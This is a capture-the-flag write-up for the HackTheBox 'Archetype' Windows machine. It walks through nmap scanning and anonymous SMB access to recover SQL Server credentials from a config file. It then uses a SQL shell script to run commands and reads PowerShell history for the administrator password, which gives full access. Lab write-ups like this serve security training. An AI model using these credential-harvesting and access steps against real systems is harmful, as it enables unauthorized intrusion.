# **HackTheBox Archtype**
## Windows MySQL

See this writeup on my HackMD page: https://hackmd.io/@b0o5t3d/HTBArchtype

### Basic Information
Machine IP: **10.10.10.27**
Type: **Windows**

### Step 1: Footprinting

Use nmap to enumerate the machine.
```
nmap -sS -sV -sC 10.10.10.27
```
Results:
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 11:35 EDT
Nmap scan report for 10.10.10.27
Host is up (0.25s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-06-10T15:51:45
|_Not valid after:  2051-06-10T15:51:45
|_ssl-date: 2021-06-10T15:58:36+00:00; +22m54s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h46m53s, deviation: 3h07m50s, median: 22m52s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-10T08:58:22-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-10T15:58:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.70 seconds
```

Since ports 445 and 1433, which are linked to SMB and SQL Server, are opened.

### Step 2: Search Samba Shares

First check the samba shares.

```
smbclient -L //10.10.10.27
```
Enter the password with nothing to check for annonymous access.

Results:
```
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available

```

Now access the share backups and list the files.

```
smbclient //10.10.10.27/backups
ls
```

Results:
```
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                10328063 blocks of size 4096. 8248188 blocks available
```

Download the file into your own machine and see it's contents.

```
get prod.dtsConfig
exit
cat prod.dtsConfig
```

Results:
```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>      
```

Notice the Password=M3g4c0rp123 and User ID=ARCHETYPE\sql_svc

### Step 3: Login to the SQL Server

Head over to https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py and change the following details:

```
MSSQL_SERVER="10.10.10.10"
MSSQL_USERNAME = "Domain\\sa_user"
MSSQL_PASSWORD = "**********"
```

to 

```
MSSQL_SERVER="10.10.10.27"
MSSQL_USERNAME = "ARCHETYPE\sql_svc"
MSSQL_PASSWORD = "M3g4c0rp123"
```

Now run the script

```
python3 mssql_shell.py
```

Run a whoami to find out the current user:

Results:
```
CMD sql_svc@ARCHETYPE C:\Windows\system32> whoami
archetype\sql_svc
```

Head to directory C:\Users\sql_svc\Desktop\ and display the user.txt file

```
cd C:/
cd Users\sql_svc\Desktop\
more user.txt
```

### Step 4: Privilege Escalation

Now, head over to C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline and display the ConsoleHost_history.txt file

Results:
```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

username: administrator password: MEGACORP_4dm1n!!

Now, go to back to the samba shares and login with these details.

```
smbclient \\10.10.10.27\C$ -U administrator 
```

Login with the password above.

Head to \Users\administrator\desktop\ and display the root.txt file.

```
cd users\administrator\desktop\
more root.txt
```
